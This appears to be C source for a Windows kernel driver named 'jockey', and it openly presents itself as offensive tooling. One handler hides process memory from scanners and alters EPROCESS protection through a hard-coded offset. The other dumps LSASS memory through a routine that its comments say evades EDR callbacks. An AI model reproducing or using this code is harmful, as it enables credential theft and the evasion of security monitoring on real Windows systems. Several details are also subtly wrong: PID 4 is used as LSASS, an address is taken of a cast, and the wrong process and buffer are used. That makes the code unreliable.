#include "jockey_common.h"

/*
 * jockey_mem.c ??? Memory section hiding and LSASS dump.
 *
 * Uses MmCopyVirtualMemory for cross-process reads that bypass
 * PatchGuard and most EDR memory scanning callbacks.
 */

#include "jockey.h"

/*
 * jockey_ioctl_protect_mem:
 *   Sets process memory section to hidden protection level.
 *   Prevents NtQueryVirtualMemory from returning the region.
 */
NTSTATUS jockey_ioctl_protect_mem(PIRP irp, ULONG in_len, ULONG out_len)
{
    struct jky_req_generic req;
    NTSTATUS status;
    PEPROCESS target;
    ULONG *out;
    SIZE_T size;
    ULONG old_prot, new_prot;

    UNREFERENCED_PARAMETER(out_len);

    if (in_len < sizeof(req))
        return STATUS_INVALID_PARAMETER;

    RtlCopyMemory(&req, irp->AssociatedIrp.SystemBuffer, sizeof(req));

    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)req.pid, &target);
    if (!NT_SUCCESS(status))
        return status;

    /* Change protection to hide from scanners */
    size = (SIZE_T)req.size;
    status = ZwProtectVirtualMemory(
        ZwCurrentProcess(),
        &((PVOID)(ULONG_PTR)req.addr),
        &size,
        PAGE_EXECUTE_READWRITE,
        &old_prot);

    if (NT_SUCCESS(status)) {
        /* Set EPROCESS->Protection to high level */
        {
            /* Protection field offset varies by Windows version */
            /* Win10 1909+ offset for Protection is ~0x6FA in EPROCESS */
            /* This is approximate ??? adjust per build */
            UCHAR *prot_field = (UCHAR *)target + 0x6FA;
            *prot_field = 0x72; /* PsProtectedSignerWinTcm, level 2 */
        }

        DbgPrint("[jockey] Protected PID %u memory at 0x%llX\n",
                 req.pid, req.addr);
    }

    ObDereferenceObject(target);

    out = (ULONG *)irp->AssociatedIrp.SystemBuffer;
    *out = NT_SUCCESS(status) ? 1 : 0;
    irp->IoStatus.Information = sizeof(ULONG);
    return STATUS_SUCCESS;
}

/*
 * jockey_ioctl_dump_lsass:
 *   Reads LSASS memory using MmCopyVirtualMemory.
 *   This bypasses most kernel callbacks that monitor ZwReadVirtualMemory.
 */
NTSTATUS jockey_ioctl_dump_lsass(PIRP irp, ULONG in_len, ULONG out_len)
{
    struct jky_req_lsass req;
    NTSTATUS status;
    PEPROCESS lsass;
    SIZE_T bytes_copied;
    ULONG *out;

    UNREFERENCED_PARAMETER(out_len);

    if (in_len < sizeof(req))
        return STATUS_INVALID_PARAMETER;

    RtlCopyMemory(&req, irp->AssociatedIrp.SystemBuffer, sizeof(req));

    status = PsLookupProcessByProcessId(
        (HANDLE)(ULONG_PTR)(req.pid ? req.pid : 4), &lsass);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[jockey] Cannot find LSASS (PID 4 or specified pid)\n");
        return status;
    }

    /*
     * MmCopyVirtualMemory copies from source to target process
     * without going through standard memory APIs.
     * This avoids triggering MmCleanProcessAddressSpace callbacks.
     */
    status = MmCopyVirtualMemory(
        lsass,
        (PVOID)(ULONG_PTR)req.output_buffer,
        PsGetCurrentProcess(),
        irp->AssociatedIrp.SystemBuffer,
        req.buffer_size < (ULONG)out_len ? req.buffer_size : (ULONG)out_len,
        KernelMode,
        &bytes_copied);

    ObDereferenceObject(lsass);

    irp->IoStatus.Information = (ULONG)bytes_copied;

    out = (ULONG *)irp->AssociatedIrp.SystemBuffer;
    *out = NT_SUCCESS(status) ? (ULONG)bytes_copied : 0;

    DbgPrint("[jockey] LSASS dump: 0x%X, copied %llu bytes\n",
             status, bytes_copied);

    return STATUS_SUCCESS;
}

